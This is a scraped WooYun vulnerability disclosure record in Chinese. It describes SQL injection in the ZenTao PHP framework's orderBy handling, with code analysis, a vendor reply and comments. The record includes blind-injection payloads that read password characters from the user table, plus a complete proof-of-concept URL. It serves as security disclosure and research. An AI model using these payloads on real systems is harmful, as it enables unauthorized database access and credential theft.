{"id": 82249, "wybug_id": "wooyun-2015-0151637", "wybug_title": "zentaoPHP框架 SQL注入漏洞（附禅道注入实例）", "wybug_corp": "禅道", "wybug_author": "xiao.k", "wybug_date": "2015-11-04 09:09", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-07：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： 当开发框架出现安全问题，程序的整体安全性将得不到保证。 详细说明：  易软天创旗下的禅道、然之、蝉知等产品，用的都是他们自行开发的zentaoPHP框架。然而这个框架在设计时判断不严谨。这导致了在使用过程中极易发生安全问题。首先看漏洞的入口`ZenTaoPMS.7.3.stable\\zentaopms\\module\\bug\\control.php`，64行。注意看$orderBy变量。\npublic function browse($productID = 0, $browseType = 'unclosed', $param = 0, $orderBy = '', $recTotal = 0, $recPerPage = 20, $pageID = 1)    {\t\t.... 省略不想关内容.....        /* Process the order by field. */        if(!$orderBy) $orderBy = $this->cookie->qaBugOrder ? $this->cookie->qaBugOrder : 'id_desc';        setcookie('qaBugOrder', $orderBy, $this->config->cookieLife, $this->config->webRoot);        /* Append id for secend sort. */        $sort = $this->loadModel('common')->appendOrder($orderBy);        /* Load pager. */        $this->app->loadClass('pager', $static = true);        if($this->app->getViewType() == 'mhtml') $recPerPage = 10;        $pager = pager::init($recTotal, $recPerPage, $pageID);        $projects = $this->loadModel('project')->getPairs();        $projects[0] = '';        /* Get bugs. */        $bugs = array();\t\t// 当browseType为all时，sort 会进入getAllBugs        if($browseType == 'all') $bugs = $this->bug->getAllBugs($productID, $projects, $sort, $pager);        elseif($browseType == \"bymodule\")        {            $childModuleIds = $this->tree->getAllChildId($moduleID);            $bugs = $this->bug->getModuleBugs($productID, $childModuleIds, $projects, $sort, $pager);        }        .... 省略不想关内容.....        $this->display();    }\n我们再看一下`getAllBugs`。\npublic function getAllBugs($productID, $projects, $orderBy, $pager = null)    {        $bugs = $this->dao->select('t1.*, t2.title as planTitle')            ->from(TABLE_BUG)->alias('t1')            ->leftJoin(TABLE_PRODUCTPLAN)->alias('t2')->on('t1.plan = t2.id')            ->where('t1.product')->eq($productID)            ->andWhere('t1.project')->in(array_keys($projects))            ->andWhere('t1.deleted')->eq(0)            ->orderBy($orderBy)->page($pager)->fetchAll();         $this->loadModel('common')->saveQueryCondition($this->dao->get(), 'bug');        return $bugs;    }\n现在，orderBy通过browse函数进入到了getAllBugs，最终带入到zentaoPHP的核心数据库类 dao。禅道、然之、蝉知都是使用的这个数据库类。接下来我们看看orderBy是怎么被解析的。关键代码在 `/lib/dao/dao.class.php`,1616行。\n//https://**.**.**.**/easysoft/zentaopms/blob/master/lib/dao/dao.class.php#L1616    public function orderBy($order)    {        if($this->inCondition and !$this->conditionIsTrue) return $this;\t\t//替换orderby里的| _,因为表名的默认前缀为zt_ 所以语句中不能带入表名。        $order  = str_replace(array('|', '', '_'), ' ', $order);        /* Add \"`\" in order string. */        /* When order has limit string. */\t\t//语句中如果有limit 那么语句将会截断，后面会再次拼接。        $pos    = stripos($order, 'limit');        $orders = $pos ? substr($order, 0, $pos) : $order;        $limit  = $pos ? substr($order, $pos) : '';        $orders = explode(',', $orders);\t\t//在这里限制了语句中不能有逗号。        foreach($orders as $i => $order)        {            $orderParse = explode(' ', trim($order));            foreach($orderParse as $key => $value)            {                $value = trim($value);                if(empty($value) or strtolower($value) == 'desc' or strtolower($value) == 'asc') continue;                $field = trim($value, '`');                /* such as t1.id field. */\t\t\t\t//这里是关键，如果$value里包含点号。那么只有后面的部分被加入``。                if(strpos($value, '.') !== false) list($table, $field) = explode('.', $field);                $field = \"`$field`\";                $orderParse[$key] = isset($table) ? $table . '.' . $field :  $field;                unset($table);            }            $orders[$i] = join(' ', $orderParse);        }\t\t//拼接之前的limit        $order = join(',', $orders) . ' ' . $limit;        $this->sql .= ' ' . DAO::ORDERBY . \" $order\";        return $this;    }\n函数的处理过程，我在代码中简单做了注释。实际上orderBy中的限制很多，不能有逗号，下划线，不能有limit，点号也不能乱用。作为一个核心的数据库类，判断还算比较严谨的。但是我们还是可以一步步的去破解。假设此处没有任何字符限制，我打算这么构造语句：\norder by if((select ord(substring(password,1,1)) from zt_user)=51,id,assignedto) # asc\n但是由于语句中不能有分号，所以我要把语句变形。\n// substring 改为 from x for x 的形式order by if((select ord(substring(password from 1 for 1)) from zt_user)=51,id,assignedto) # asc// if 语句用 case when ... then ... else ... end 代替order by CASE WHEN (select ord(substring(password from 1 for 1)) from zt_user)=51 THEN id ELSE assignedto END) #asc\n如果目标的数据库前缀没有下划线，那么注入不成问题。   漏洞证明：  **.**.**.**/index.php?m=bug&f=browse&productID=1&browseType=unclosed&param=0&orderBy=(CASE/**/WHEN/**/(SELECT/**/ORD(substring(user()/**/from/**/1/**/for/**/1)))=113/**/THEN/**/id/**/ELSE/**/assignedto/**/END)%23._asc\n\n   修复方案：  加强框架的安全性。   版权声明：转载请注明来源 xiao.k@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-11-04 09:19 厂商回复： 谢谢反馈。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-11-04 09:11 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:711 漏洞数:73        | root@qisec.com)\t\t \n  1    \n     2015-11-04 09:25 |    \t\ts3xy \t\t\t( 核心白帽子 |\t\t\t        Rank:938 漏洞数:124        | 相濡以沫，不如相忘于江湖)\t\t \n  2    \n     2015-11-04 09:30 |    \t\t不能忍 \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:41        | 要是能重来，我要选李白!)\t\t \n  大牛好友很多这个系统的漏洞，大牛发个合集。哈哈    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}